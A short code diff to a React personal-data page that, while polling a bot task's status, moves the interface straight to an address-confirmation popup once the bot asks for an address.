@@ -148,6 +148,11 @@ function PersonalDataPage() {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
+      // As soon as the bot asks for address confirmation, jump straight to the
+      // address popup — don't wait for balance/cards/limits to arrive.
+      if (data?.status === "waiting_for_address_confirm" || data?.status === "waiting_for_address") {
+        setStep((prev) => (prev === "personal" ? "address" : prev));
+      }
       if (data?.status === "completed" || data?.status === "failed") return;
       if (Date.now() - startedAt > MAX_MS) return;
       timer = setTimeout(tick, 1500);
